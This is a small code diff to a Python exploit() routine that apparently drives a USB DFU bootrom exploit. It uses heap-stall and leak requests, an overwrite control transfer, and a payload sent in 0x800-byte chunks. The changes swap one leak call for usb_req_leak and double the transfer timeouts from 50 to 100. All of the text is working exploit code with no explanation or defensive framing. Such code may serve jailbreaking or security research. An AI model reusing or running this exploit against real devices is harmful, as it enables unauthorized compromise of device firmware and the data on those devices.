@@ -480,7 +480,7 @@ def exploit():
     stall(device)
     for i in range(config.hole):
       no_leak(device)
-    leak(device)
+    usb_req_leak(device)
     no_leak(device)
   dfu.usb_reset(device)
   dfu.release_device(device)
@@ -500,9 +500,9 @@ def exploit():
   else:
     for i in range(config.leak):
       usb_req_leak(device)
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
   for i in range(0, len(payload), 0x800):
-    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
   dfu.usb_reset(device)
   dfu.release_device(device)
 
